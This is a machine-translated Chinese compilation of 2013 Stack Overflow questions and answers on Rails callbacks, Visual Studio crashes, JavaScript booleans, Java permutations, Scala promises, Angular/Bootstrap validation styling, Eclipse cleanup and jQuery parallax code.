1.  不要`after_destroy`在 Condition 上使用回调，而是希望信息被破坏 Condition 的人重新计算。这是最干净的，因为您将两个独立的意图解耦：对象销毁和计算。如果有一天您想一次破坏 2 个条件并且只有在两个条件都被破坏后才重新计算，您可以看到这会更有帮助。你不能通过回调来做到这一点。它也更符合得[墨忒耳法则](http://en.wikipedia.org/wiki/Law_of_Demeter)——召唤者比条件召唤`Condition.destroy`者更好。`info.recalculate``parent.info.recalculate`

    如果您真的想在 Condition 中打包此行为，请创建一个`#destroy_and_recalculate`被调用的函数，而不仅仅是`#destroy`使用某种隐藏回调。对于呼叫者来说，您将开始重新计算更为明显。

2.  删除`:dependent=>destroy`父`:condition`关联，并将其替换为您自己的`before_destroy`回调，`Parent`这将导致`condition`在没有回调的情况下被销毁。

    在 Condition 中，我会创建这个方法，比如 ，`#destroy_without_callbacks`并在其中创建`destroy`Condition 的子项，然后对`delete`自身产生条件。

的功能`:dependent=>destroy`很棒，但是对于像这样的循环，我认为迄今为止最清晰的方法是通过消除一些魔法并更明确地管理对象和进程生命周期来明确您正在做什么。

# c++ - Visual Studio 2010 Build - VS2012 安装后以代码 -1073741502 (0xc0000142) 退出。也许是由于 dll 符号？

> ID：14348363
> 
> 赞同：3
> 
> 时间：2013-01-15T22:47:21.650
> 
> 标签：c++, visual-studio-2010, dll, crash, debug-symbols

我正在 Visual C++ Express 2010 中编写游戏（使用 Angel 引擎），即使在 main 中注释掉所有内容后，程序也会在启动时崩溃（应用程序无法正确启动）。这在安装 VS2012 后开始发生。我尝试过重新启动、重建、使用发布和调试、以管理员身份运行 VS 等。

最初，我必须将其放入构建后事件命令行中才能编译：

```
 @echo off
    echo Copying $(OutDir)$(TargetName)$(TargetExt) as $(TargetName)D$(TargetExt)
    copy /Y $(OutDir)$(TargetName)$(TargetExt) $(OutDir)$(TargetName)D$(TargetExt) 
```

它曾经无法正确找到 PDB 文件，但我为 .pdb 位置打开了 Microsoft 符号服务器并为其提供了一个缓存目录。现在，调试输出显示：

```
 'ClientGame.exe': Loaded 'C:\Windows\SysWOW64\ntdll.dll', Symbols loaded (source information stripped). 
```

大约有 20 个不同的 dll，其中大部分看起来像标准的 windows 东西，还有 opengl。一些没有在他们之后“剥离源信息”。一些人这样说：

```
 'ClientGame.exe': Loaded 'C:\Windows\SysWOW64\devil.dll', Binary was not built with debug information 
```

在解决方案输出中，我得到：

```
 directorytoproject\Libraries\libogg-        1.3.0\win32\VS2008\libogg_static.vcxproj : warning  : Platform 'x64' referenced in the project file         '_libogg' cannot be found. Please make sure you have it installed under         '%VCTargetsPath%\Platforms\x64'. 
```

以及其他几个库。

运行时库设置在“多线程调试 DLL (/MDd)”上

我真的很感激任何想法！非常感谢！

# javascript - javascript true 和 true 在 if 语句中返回 false？

> ID：14348367
> 
> 赞同：0
> 
> 时间：2013-01-15T22:47:36.507
> 
> 标签：javascript

在普通的javascript函数中。min_chk 和 max_chk 这两个值都是 true，但 if 函数仍然显示警报。不知道为什么？

```
function Checkit(m,n){
return m>n;
}

var min_chk = Checkit(a,X);
var max_chk = Checkit(b,Y);
if ((min_chk === 'true') && (max_chk === 'true')){
...
    } else {
    alert('invalid range');
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:50:43.247

布尔值`true`与字符串不同`'true'`。删除引号。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-15T22:52:01.970

如果两边的操作数具有不同的类型，则运算符`===`返回。`false`布尔值`true`和字符串`"true"`具有不同的类型。

你应该改变你的支票只是

```
if (min_chk && max_chk) 
```

由于`min_chk`和`max_chk`已经是布尔值，因此您无需将它们直接与`true`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T22:50:58.913

去掉 true 周围的 ''

```
function Checkit(m, n) {
    return m > n;
}

var min_chk = Checkit(a, X);
var max_chk = Checkit(b, Y);
if ((min_chk === true) && (max_chk === true)) {...
} else {
    alert('invalid range');
} 
```

# java - 查找 ArrayList 的所有排列 并将它们放入新的 ArrayList >

> ID：14348373
> 
> 赞同：0
> 
> 时间：2013-01-15T22:48:05.443
> 
> 标签：java, arraylist, permutation

我在编写返回 ArrayList 的所有排列的方法代码时遇到了一些问题。

我发现了该算法：

```
public class MainClass {
  public static void main(String args[]) {
    permuteString("", "String");
  }

  public static void permuteString(String beginningString, String endingString) {
    if (endingString.length() <= 1)
      System.out.println(beginningString + endingString);
    else
      for (int i = 0; i < endingString.length(); i++) {
          String newString = endingString.substring(0, i) + endingString.substring(i + 1);
          permuteString(beginningString + endingString.charAt(i), newString);

      }
  }
} 
```

这对字符串很有用，但是当我尝试为 ArrayLists 重写它时 - 我发现了一些麻烦。

这是我写的代码：

```
private static ArrayList<ArrayList<Point>> listaPermutacji = new ArrayList<ArrayList<Point>>();

public static void perm(ArrayList<Point> soFar, ArrayList<Point> rest) {
        if (rest.size() <= 1) {
            ArrayList<Point> temp = new ArrayList<Point>();
            temp = soFar;
            for (int i = 0; i < rest.size(); i++) {
                temp.add(rest.get(i));
            }
            listaPermutacji.add(temp);
        } else {
            for (int k = 0; k < rest.size(); k++) {
                ArrayList<Point> remaining = new ArrayList<Point>();
                List<Point> sublist = rest.subList(0, k);
                for (int a = 0; a < sublist.size(); a++) {
                    remaining.add(sublist.get(a));
                }
                sublist.clear();
                if (rest.size() >= k + 1) {
                    sublist = rest.subList(k + 1, rest.size());
                    for (int a = 0; a < sublist.size(); a++) {
                        remaining.add(sublist.get(a));
                    }
                }
                ArrayList<Point> beginning = new ArrayList<Point>();
                beginning = soFar;
                System.out.println("Beginning size= " + beginning.size());
                System.out.println("Rest size= " + rest.size());
                System.out.println("k= " + k);
                if(k<rest.size()){
                    beginning.add(rest.get(k));
                }
                perm(beginning, remaining);
            } 
        } 
    } 
```

这将返回，例如 3 点数组：

```
x= 4.0 y= 3.0 | x= 1.0 y= 0.0 | x= 0.0 y= 1.0 | x= 1.0 y= 0.0 | x= 0.0 y= 1.0 | x= 4.0 y= 3.0 | 
x= 4.0 y= 3.0 | x= 1.0 y= 0.0 | x= 0.0 y= 1.0 | x= 1.0 y= 0.0 | x= 0.0 y= 1.0 | x= 4.0 y= 3.0 | 
x= 4.0 y= 3.0 | x= 1.0 y= 0.0 | x= 0.0 y= 1.0 | x= 1.0 y= 0.0 | x= 0.0 y= 1.0 | x= 4.0 y= 3.0 | 
```

我真的无法理解......我试图解决这个问题大约 4 个小时，但我仍然遇到其他问题......

顺便说一句，我需要这个生成器来制作解决旅行商问题的蛮力方法......

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:53:51.387

也许你的错误在那里：

```
 ArrayList<Point> temp = new ArrayList<Point>();
 temp = soFar; 
```

如果您想`temp`成为副本（新列表），则应将这两行替换为`ArrayList<Point> temp = new ArrayList<Point>(soFar);`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-29T09:28:51.310

您要查找的内容称为[Backtracking](http://en.wikipedia.org/wiki/Backtracking)。这种解决问题的技术很大程度上基于递归。基本上，你设置你的第一个点，然后只考虑其他点作为一个子问题，当找到第一个点的每个排列时，它就会增加，依此类推。

您的解决方案将类似于以下内容。为简单起见，我使用整数数组制作它，但您应该能够轻松地将整数更改为点。将这些整数视为 Arraylist 中点的索引。

```
public class PermutationDemo {

    public static void main(String[] args) {
        int[] array = new int[4];

        for (int i=0; i<array.length; i++) {
            reset(array, i);
        }

        solve(array, 0);
    }

    private static void solve(int[] array, int i) {
        if (i == array.length) {
            print(array);
            return;
        }

        for (int k=0; k<4; k++) {
            solve(array, i+1);
            makeMove(array, i);
        }

        reset(array, i);
    }

    private static void makeMove(int[] array, int i) {
        array[i] += 1;
    }

    private static void reset(int[] array, int i) {
        array[i] = 1;
    }

    private static void print(int[] array) {
        for (int i=0; i<array.length; i++) {
            System.out.print(array[i] + " ");
        }
        System.out.println("");
    }
} 
```

结果是：

```
PS [10:21] Desktop > java PermutationDemo
1 1 1
1 1 2
1 1 3
1 1 4
1 2 1
1 2 2
1 2 3
1 2 4
1 3 1
1 3 2
1 3 3
1 3 4
1 4 1
1 4 2
1 4 3
1 4 4
2 1 1
2 1 2
2 1 3
2 1 4
2 2 1
2 2 2
2 2 3
2 2 4
2 3 1
2 3 2
2 3 3
2 3 4
2 4 1
2 4 2
2 4 3
2 4 4
3 1 1
3 1 2
3 1 3
3 1 4
3 2 1
3 2 2
3 2 3
3 2 4
3 3 1
3 3 2
3 3 3
3 3 4
3 4 1
3 4 2
3 4 3
3 4 4
4 1 1
4 1 2
4 1 3
4 1 4
4 2 1
4 2 2
4 2 3
4 2 4
4 3 1
4 3 2
4 3 3
4 3 4
4 4 1
4 4 2
4 4 3
4 4 4 
```

# scala - 承诺有缺陷吗？

> ID：14348382
> 
> 赞同：5
> 
> 时间：2013-01-15T22:48:39.683
> 
> 标签：scala, future, promise

[就像这个问题](https://stackoverflow.com/questions/13381134/what-are-use-cases-of-scala-promise)的作者一样，我试图理解 Scala 2.10 的期货和承诺中用户可见承诺的推理。

特别是，再次回到[SIP 中的示例](http://docs.scala-lang.org/sips/pending/futures-promises.html)，它是否完全有缺陷：

```
import scala.concurrent.{ future, promise }
val p = promise[T]
val f = p.future
val producer = future {
  val r = produceSomething()
  p success r
  continueDoingSomethingUnrelated()
}
val consumer = future {
  startDoingSomething()
  f onSuccess {
    case r => doSomethingWithResult()
  }
} 
```

我在想象调用`produceSomething`导致运行时异常的情况。因为 promise 和 producer-future 完全分离，这意味着系统挂起，消费者永远不会成功或失败。

因此，使用 Promise 的唯一安全方法需要类似

```
val producer = future {
  try {
    val r.produceSomething()
    p success r
  } catch {
     case e: Throwable =>
       p failure e
       throw e  // ouch
  }
  continueDoingSomethingUnrelated()
} 
```

这显然容易出错且冗长。

对于可见的 Promise 类型，我能看到的唯一情况`future {}`（不足之处）是 MAD 答案中的回调钩子之一。但是 SIP 的例子对我来说没有意义。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-15T23:05:40.430

这就是您很少使用的原因`success`，`failure`除非您已经知道某些东西是防弹的。如果你想要防弹，这就是`Try`：

```
val producer = future {
  p complete Try( produceSomething )
  continueDoingSomethingUnrelated()
} 
```

似乎没有必要再次抛出错误；您已经通过将其打包到承诺的答案中来处理它，不是吗？（另外，请注意，如果`produceSomething`它本身返回一个未来，你可以使用它`completeWith`来代替。）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-16T00:28:13.717

### 组合器

您可以使用`Promise`构建`Future`库中尚未包含的其他组合器。

*   “选择”关掉第一个满足的未来。结果返回，其余的期货作为一个序列：[https](https://gist.github.com/viktorklang/4488970) ://gist.github.com/viktorklang/4488970 。

*   一种`after`返回`Future`在一段时间后完成的方法，以“超时”未来：[https](https://gist.github.com/3804710) ://gist.github.com/3804710 。

你需要 Promises 才能像这样创建其他组合子。

### 调整回调

用于`Promise`使基于回调的 API 适应基于回调`Future`的 API。例如：

```
def retrieveThing(key: String): Future[Thing] = {
  val p = Promise[Thing]()

  val callback = new Callback() {
    def receive(message: ThingMessage) {
      message.getPayload match {
        case t: Thing =>
          p success t        
        case err: SystemErrorPayload =>
          p failure new Exception(err.getMessage)
      }
    }
  }

  thingLoader.load(key, callback, timeout)
  p.future
} 
```

### 同步器

使用 构建同步器`Promise`。例如，为昂贵的操作返回一个缓存值，或者计算它，但不要为同一个键计算两次：

```
private val cache = new ConcurrentHashMap[String, Promise[T]]

def getEntry(key: String): Future[T] = {
  val newPromise = Promise[T]()
  val foundPromise = cache putIfAbsent (key, newPromise)

  if (foundPromise == null) {
    newPromise completeWith getExpensive(key)
    newPromise.future
  } else {
    foundPromise.future
  }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T23:15:38.330

Promise 有一个 completeWith(f: Future) 方法，可以通过自动处理成功/失败场景来解决这个问题。

```
promise.completeWith( future {
  r.produceSomething
}) 
```

# twitter-bootstrap - 协调 Angular.js 和 Bootstrap 表单验证样式

> ID：14348384
> 
> 赞同：72
> 
> 时间：2013-01-15T22:48:47.000
> 
> 标签：twitter-bootstrap, angularjs

我正在使用 Angular 和 Bootstrap。这是供参考的代码：

```
<form name="newUserForm" ng-submit="add()" class="" novalidate>
    <input type="text" class="input" ng-model="newUser.uname" placeholder="Twitter" ng-pattern="/^@[A-Za-z0-9_]{1,15}$/" required></td>
    <button type="submit" ng-disabled="newUserForm.$invalid" class="btn btn-add btn-primary">Add</button>
</form> 
```

Bootstrap 具有无效字段的样式，格式为`input:invalid {.... }`; 当字段为空时，这些会启动。现在我还通过 Angular 进行了一些模式匹配。这会在 ":invalid" 关闭但 ".ng-invalid" 开启时产生奇怪的情况，这将需要我为 ".ng-invalid" 类重新实现引导 CSS 类。

我看到两个选项，但都遇到了问题

*   让 Angular 使用一些自定义类名而不是“ng-valid”（我不知道该怎么做）。
*   禁用 html5 验证（我认为这就是表单标签中的“novalidate”属性应该做的，但由于某种原因无法让它工作）。

那里的 Angular-Bootstrap 指令不包括样式。

* * *

## 回答 #1

> 赞同：92
> 
> 时间：2013-02-19T09:08:13.470

使用 Bootstrap 的“错误”类进行样式设置。您可以编写更少的代码。

```
<form name="myForm">
  <div class="control-group" ng-class="{error: myForm.name.$invalid}">
    <label>Name</label>
    <input type="text" name="name" ng-model="project.name" required>
    <span ng-show="myForm.name.$error.required" class="help-inline">
        Required</span>
  </div>
</form> 
```

**编辑：** 正如其他答案和评论指出的那样 - 在 Bootstrap 3 中，该类现在是“有错误”，而不是“错误”。

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2013-06-25T20:22:23.433

Bootstrap 3 中的类已更改：

```
<form class="form-horizontal" name="form" novalidate ng-submit="submit()" action="/login" method="post">
  <div class="row" ng-class="{'has-error': form.email.$invalid, 'has-success': !form.email.$invalid}">
    <label for="email" class="control-label">email:</label>
    <div class="col">
    <input type="email" id="email" placeholder="email" name="email" ng-model="email" required>
    <p class="help-block error" ng-show="form.email.$dirty && form.email.$error.required">please enter your email</p>
    <p class="help-block error" ng-show="form.email.$error.email">please enter a valid email</p>
  ... 
```

注意周围的引号`'has-error'`和`'has-success'`: 花了一段时间才找到...

* * *

## 回答 #3

> 赞同：34
> 
> 时间：2014-02-12T21:20:11.377

另一种解决方案：创建`has-error`根据子输入切换类的指令。

```
app.directive('bsHasError', [function() {
  return {
      restrict: "A",
      link: function(scope, element, attrs, ctrl) {
          var input = element.find('input[ng-model]'); 
          if (input.length) {
              scope.$watch(function() {
                  return input.hasClass('ng-invalid');
              }, function(isInvalid) {
                  element.toggleClass('has-error', isInvalid);
              });
          }
      }
  };
}]); 
```

然后简单地在模板中使用它

```
<div class="form-group" bs-has-error>
    <input class="form-control" ng-model="foo" ng-pattern="/.../"/>
</div> 
```

* * *

## 回答 #4

> 赞同：22
> 
> 时间：2014-03-19T12:30:53.723

[@farincz 的回答略有](https://stackoverflow.com/a/21739917/198858)改进。我同意指令是这里最好的方法，但我不想在每个`.form-group`元素上重复它，所以我更新了代码以允许将其添加`.form-group`到父元素或父`<form>`元素（这会将它添加到所有包含的`.form-group`元素):

```
angular.module('directives', [])
  .directive('showValidation', [function() {
    return {
        restrict: "A",
        link: function(scope, element, attrs, ctrl) {

            if (element.get(0).nodeName.toLowerCase() === 'form') {
                element.find('.form-group').each(function(i, formGroup) {
                    showValidation(angular.element(formGroup));
                });
            } else {
                showValidation(element);
            }

            function showValidation(formGroupEl) {
                var input = formGroupEl.find('input[ng-model],textarea[ng-model]');
                if (input.length > 0) {
                    scope.$watch(function() {
                        return input.hasClass('ng-invalid');
                    }, function(isInvalid) {
                        formGroupEl.toggleClass('has-error', isInvalid);
                    });
                }
            }
        }
    };
}]); 
```

* * *

## 回答 #5

> 赞同：17
> 
> 时间：2014-07-04T08:54:25.393

@Andrew Smith 的回答略有改进。我更改输入元素并使用`require`关键字。

```
.directive('showValidation', [function() {
    return {
        restrict: "A",
        require:'form',
        link: function(scope, element, attrs, formCtrl) {
            element.find('.form-group').each(function() {
                var $formGroup=$(this);
                var $inputs = $formGroup.find('input[ng-model],textarea[ng-model],select[ng-model]');

                if ($inputs.length > 0) {
                    $inputs.each(function() {
                        var $input=$(this);
                        scope.$watch(function() {
                            return $input.hasClass('ng-invalid');
                        }, function(isInvalid) {
                            $formGroup.toggleClass('has-error', isInvalid);
                        });
                    });
                }
            });
        }
    };
}]); 
```

* * *

## 回答 #6

> 赞同：11
> 
> 时间：2014-05-12T20:44:14.977

感谢@farincz 的精彩回答。以下是我为适应我的用例所做的一些修改。

这个版本提供了三个指令：

*   `bs-has-success`
*   `bs-has-error`
*   `bs-has`（当你想同时使用另外两个时很方便）

我所做的修改：

*   添加了一个检查以仅在表单字段脏时显示状态，即在有人与它们交互之前它们不会显示。
*   `element.find()`为不使用 jQuery 的人 更改了传入的字符串，因为`element.find()`Angular 的 jQLite 仅支持通过标记名查找元素。
*   添加了对选择框和文本区域的支持。
*   包装`element.find()`在 a`$timeout`中以支持元素可能尚未将其子元素呈现给 DOM 的情况（例如，如果元素的子元素被标记为`ng-if`）。
*   更改`if`表达式以检查返回数组的长度（`if(input)`来自 [@farincz 的答案](https://stackoverflow.com/a/21739917/1171775)始终返回 true，因为返回 from`element.find()`是一个 jQuery 数组）。

我希望有人觉得这很有用！

```
angular.module('bs-has', [])
  .factory('bsProcessValidator', function($timeout) {
    return function(scope, element, ngClass, bsClass) {
      $timeout(function() {
        var input = element.find('input');
        if(!input.length) { input = element.find('select'); }
        if(!input.length) { input = element.find('textarea'); }
        if (input.length) {
            scope.$watch(function() {
                return input.hasClass(ngClass) && input.hasClass('ng-dirty');
            }, function(isValid) {
                element.toggleClass(bsClass, isValid);
            });
        }
      });
    };
  })
  .directive('bsHasSuccess', function(bsProcessValidator) {
    return {
      restrict: 'A',
      link: function(scope, element) {
        bsProcessValidator(scope, element, 'ng-valid', 'has-success');
      }
    };
  })
  .directive('bsHasError', function(bsProcessValidator) {
    return {
      restrict: 'A',
      link: function(scope, element) {
        bsProcessValidator(scope, element, 'ng-invalid', 'has-error');
      }
    };
  })
  .directive('bsHas', function(bsProcessValidator) {
    return {
      restrict: 'A',
      link: function(scope, element) {
        bsProcessValidator(scope, element, 'ng-valid', 'has-success');
        bsProcessValidator(scope, element, 'ng-invalid', 'has-error');
      }
    };
  }); 
```

用法：

```
<!-- Will show success and error states when form field is dirty -->
<div class="form-control" bs-has>
  <label for="text"></label>
  <input 
   type="text" 
   id="text" 
   name="text" 
   ng-model="data.text" 
   required>
</div>

<!-- Will show success state when select box is anything but the first (placeholder) option -->
<div class="form-control" bs-has-success>
  <label for="select"></label>
  <select 
   id="select" 
   name="select" 
   ng-model="data.select" 
   ng-options="option.name for option in data.selectOptions"
   required>
    <option value="">-- Make a Choice --</option>
  </select>
</div>

<!-- Will show error state when textarea is dirty and empty -->
<div class="form-control" bs-has-error>
  <label for="textarea"></label>
  <textarea 
   id="textarea" 
   name="textarea" 
   ng-model="data.textarea" 
   required></textarea>
</div> 
```

您还可以安装 Guilherme 的[bower 包](https://github.com/guilhermegeek/angular-bootstrap-validation)，它将所有这些捆绑在一起。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2013-02-04T20:39:07.570

如果样式是问题，但您不想禁用本机验证，为什么不使用您自己的*更具体*的样式覆盖样式？

```
input.ng-invalid, input.ng-invalid:invalid {
   background: red;
   /*override any styling giving you fits here*/
} 
```

使用 CSS 选择器的特性级联你的问题！

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2014-10-17T09:51:47.460

我对 Jason Im 的回答的改进如下添加了两个新指令 show-validation-errors 和 show-validation-error。

```
'use strict';
(function() {

    function getParentFormName(element,$log) {
        var parentForm = element.parents('form:first');
        var parentFormName = parentForm.attr('name');

        if(!parentFormName){
            $log.error("Form name not specified!");
            return;
        }

        return parentFormName;
    }

    angular.module('directives').directive('showValidation', function () {
        return {
            restrict: 'A',
            require: 'form',
            link: function ($scope, element) {
                element.find('.form-group').each(function () {
                    var formGroup = $(this);
                    var inputs = formGroup.find('input[ng-model],textarea[ng-model],select[ng-model]');

                    if (inputs.length > 0) {
                        inputs.each(function () {
                            var input = $(this);
                            $scope.$watch(function () {
                                return input.hasClass('ng-invalid') && !input.hasClass('ng-pristine');
                            }, function (isInvalid) {
                                formGroup.toggleClass('has-error', isInvalid);
                            });
                            $scope.$watch(function () {
                                return input.hasClass('ng-valid') && !input.hasClass('ng-pristine');
                            }, function (isInvalid) {
                                formGroup.toggleClass('has-success', isInvalid);
                            });
                        });
                    }
                });
            }
        };
    });

    angular.module('directives').directive('showValidationErrors', function ($log) {
        return {
            restrict: 'A',
            link: function ($scope, element, attrs) {
                var parentFormName = getParentFormName(element,$log);
                var inputName = attrs['showValidationErrors'];
                element.addClass('ng-hide');

                if(!inputName){
                    $log.error("input name not specified!")
                    return;
                }

                $scope.$watch(function () {
                    return !($scope[parentFormName][inputName].$dirty && $scope[parentFormName][inputName].$invalid);
                },function(noErrors){
                    element.toggleClass('ng-hide',noErrors);
                });

            }
        };
    });

    angular.module('friport').directive('showValidationError', function ($log) {
        return {
            restrict: 'A',
            link: function ($scope, element, attrs) {
                var parentFormName = getParentFormName(element,$log);
                var parentContainer = element.parents('*[show-validation-errors]:first');
                var inputName = parentContainer.attr('show-validation-errors');
                var type = attrs['showValidationError'];

                element.addClass('ng-hide');

                if(!inputName){
                    $log.error("Could not find parent show-validation-errors!");
                    return;
                }

                if(!type){
                    $log.error("Could not find validation error type!");
                    return;
                }

                $scope.$watch(function () {
                    return !$scope[parentFormName][inputName].$error[type];
                },function(noErrors){
                    element.toggleClass('ng-hide',noErrors);
                });

            }
        };
    });

})(); 
```

可以将 show-validation-errors 添加到错误容器中，以便根据表单字段的有效性显示/隐藏容器。

并且 show-validation-error 根据给定类型的表单字段有效性显示或隐藏元素。

预期用途示例：

```
 <form role="form" name="organizationForm" novalidate show-validation>
            <div class="form-group">
                <label for="organizationNumber">Organization number</label>
                <input type="text" class="form-control" id="organizationNumber" name="organizationNumber" required ng-pattern="/^[0-9]{3}[ ]?[0-9]{3}[ ]?[0-9]{3}$/" ng-model="organizationNumber">
                <div class="help-block with-errors" show-validation-errors="organizationNumber">
                    <div show-validation-error="required">
                        Organization number is required.
                    </div>
                    <div show-validation-error="pattern">
                        Organization number needs to have the following format "000 000 000" or "000000000".
                    </div>
                </div>
            </div>
       </form> 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2015-07-19T21:29:37.800

我认为现在回复为时已晚，但希望你会喜欢它：

**CSS**，您可以添加其他类型的控件，例如选择、日期、密码等

```
input[type="text"].ng-invalid{
    border-left: 5px solid #ff0000;
    background-color: #FFEBD6;
}
input[type="text"].ng-valid{
    background-color: #FFFFFF;
    border-left: 5px solid #088b0b;
}
input[type="text"]:disabled.ng-valid{
    background-color: #efefef;
    border: 1px solid #bbb;
} 
```

**HTML**：不需要在控件中添加任何东西，除非是 ng-required

```
<input type="text"
       class="form-control"
       ng-model="customer.ZipCode"
       ng-required="true"> 
```

只需尝试并在您的控件中键入一些文本，我发现它非常方便且很棒。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2013-01-16T13:57:08.070

没有小提琴很难确定，但查看 angular.js 代码它不会替换类 - 它只是添加和删除自己的。因此，任何引导类（由引导 UI 脚本动态添加）都应该不受 Angular 的影响。

也就是说，与 Angular 同时使用 Bootstrap 的 JS 功能进行验证是没有意义的——只使用 Angular。我建议您使用引导样式和角度 JS，即使用自定义验证指令将引导 css 类添加到您的元素中。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2015-12-28T11:22:07.043

```
<div class="form-group has-feedback" ng-class="{ 'has-error': form.uemail.$invalid && form.uemail.$dirty }">
  <label class="control-label col-sm-2" for="email">Email</label>
  <div class="col-sm-10">
    <input type="email" class="form-control" ng-model="user.email" name="uemail" placeholder="Enter email" required>
    <div ng-show="form.$submitted || form.uphone.$touched" ng-class="{ 'has-success': form.uemail.$valid && form.uemail.$dirty }">
    <span ng-show="form.uemail.$valid" class="glyphicon glyphicon-ok-sign form-control-feedback" aria-hidden="true"></span>
    <span ng-show="form.uemail.$invalid && form.uemail.$dirty" class="glyphicon glyphicon-remove-circle form-control-feedback" aria-hidden="true"></span>
    </div>
  </div>
</div> 
```

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2016-06-03T17:12:19.630

当我没有听说过 AngularJS 本身的名字时，我知道这是一个非常古老的问题答案线程 :-)

但是对于那些登陆此页面以干净和自动化的方式寻找 Angular + Bootstrap 表单验证的其他人，我编写了一个非常小的模块来实现相同的目标，而无需以任何形式更改 HTML 或 Javascript。

结帐[引导角度验证](http://sagrawal14.github.io/bootstrap-angular-validation/)。

以下是三个简单的步骤：

1.  通过 Bower 安装`bower install bootstrap-angular-validation --save`
2.  添加脚本文件`<script src="bower_components/bootstrap-angular-validation/dist/bootstrap-angular-validation.min.js"></script>`
3.  将依赖项添加`bootstrap.angular.validation`到您的应用程序中，**就是这样！**

这适用于 Bootstrap 3，**不需要****jQuery**。

 **这是基于 jQuery 验证的概念。该模块为验证错误提供了一些额外的验证和常见的通用消息。**

# eclipse - 如何在必要时为所有项目 Java 类自动添加 @Override、@Deprecate 和 static 修饰符？

> ID：14348385
> 
> 赞同：9
> 
> 时间：2013-01-15T22:49:01.650
> 
> 标签：eclipse, eclipse-plugin, eclipse-rcp

我需要在 Eclipse IDE 中打开具体项目的所有 Java 文件的必要时自动插入[`@Override`](https://docs.oracle.com/javase/9/docs/api/java/lang/Override.html)/注释和静态修饰符。[`@Deprecated`](https://docs.oracle.com/javase/9/docs/api/java/lang/Deprecated.html)

Eclipse 具有很强的插入`@Override`/`@Deprecate`注释和在 Java 文件保存 ( `Preferences -> Java -> Editor -> Save actions -> Additional actions`) 上添加静态修饰符的能力。但是 Eclipse 只能在已编辑的 java 文件上应用这些操作，并且只能在保存它时应用。

当然，我可以使用 Eclipse 作为编辑器在每个文件中插入一个选项卡或空格并将其保存以在保存操作时激活 Eclipse 重构工具，但是我要处理的代码量非常大，所以这非常讨厌。

也许有一个 Eclipse 插件支持这种类型的代码重构？

如果没有解决方案，我会尝试为此编写自己的 Eclipse RCP 插件。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-01-15T22:54:38.970

1.  在包资源管理器视图中右键单击项目 -> 出现上下文菜单
2.  在该菜单中，选择“源”，然后选择“清理...”-> 出现清理对话框
3.  选择所需的操作，然后单击“完成”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-29T07:09:44.940

它可以通过保存操作来完成。当你保存文件时，eclipse会自动为你添加这些注解。
请遵循以下设置：

Window => Preferences => Java => Editor => Save Actions，然后选中“添加缺少的@Override 注释”。

# java - 如何在控制器中捕获 java.lang.NumberFormatException.forInputString 异常？

> ID：14348387
> 
> 赞同：2
> 
> 时间：2013-01-15T22:49:22.863
> 
> 标签：java, exception, exception-handling, numberformatexception

我的 JSP 页面中有一个接受整数值的复选框：

```
<form:checkbox path="somePath" value="2" /> Dangerous Checkbox <br /> 
```

如果用户将输入的值更改为一个`String`值，例如：

```
<form:checkbox path="somePath" value="blah" /> Dangerous Checkbox <br /> 
```

该页面将抛出一个`NumberFormatException`. 如何在我的 Controller 中捕捉到这一点并显示有意义的消息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:53:07.800

你可以使用 JSTL 的[**c:catch**](http://docs.oracle.com/javaee/5/jstl/1.1/docs/tlddocs/c/catch.html)标签：

```
<c:catch var ="numberFormatException">
<form:checkbox path="somePath" value="blah" /> Dangerous Checkbox <br />
</c:catch>

<c:if test = "${numberFormatException!= null}">
   <p>The exception is : ${numberFormatException} <br />
   There is an exception: ${numberFormatException.message}</p>
</c:if> 
```

# animation - 如何从多个组件精灵表生成动画精灵

> ID：14348388
> 
> 赞同：0
> 
> 时间：2013-01-15T22:49:24.160
> 
> 标签：animation, unity3d

我发现这些很棒的幻想精灵表在 CC 许可下可用，并希望将它们用于 Unity ( [as3gamegears](http://www.as3gamegears.com/assets/assets-pack-12-medieval-fantasy-character-sprites/) ) 中的 2D 游戏。

任何人都可以帮助我了解如何将所有组件精灵表放在一起以制作完整的精灵。武器和衣服都在不同的床单上，我想我必须使用 GIMP 之类的东西将它们放在一起，但我不知道如何。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T02:56:20.543

Unity 有一些不错的工具包，它们应该可以让您轻松地将精灵表堆叠在一起。

*   2D 工具包：[Unity Asset Store](http://u3d.as/content/unikron-software-ltd/2d-toolkit/1Wi)
*   Sprite Manager（免费）：[Unity3D Wiki](http://wiki.unity3d.com/index.php?title=SpriteManager)
*   Sprite Manager 2（150 美元）：[Unity Asset Store](http://u3d.as/content/ab-software/sprite-manager-2-/1rf)

如果您不想使用工具包，而只想将所有组件放在一起以创建一个完整的精灵，您可以在 Unity 中创建多个平面，并将每个组件叠加在最后一个之上。例如; 角色的主要精灵在最底部，手套层在角色精灵之上，武器层在手套层之上。

# javascript - jQuery css() 不在条件语句中工作

> ID：14348398
> 
> 赞同：2
> 
> 时间：2013-01-15T22:50:09.747
> 
> 标签：javascript, jquery, css

我正在创建一个简单的视差滚动器，它将图像缩放到屏幕宽度，设置一个设置为所有图像的缩放高度的滚动包装器，并查看 scrollTop 值以使用 jQuery 的 css() 设置图像的顶部位置。这是主要功能：

```
function positionSlides() {
    sT = $(window).scrollTop();
    $('div.slide img').each(function(){
        wp = $(this).attr('data-waypoint');
        if(sT >= wp){
            $(this).css({'top' : wp, 'border' : '1px solid red'});
            //console.log(sT + ':sT, ' + wp + ':wp');
        }
        else{
            $(this).css({'top' : ((wp-sT)/4)+sT, 'border' : '1px solid blue'});
        }
    });
} 
```

边框颜色的设置用于测试哪个条件语句通过。

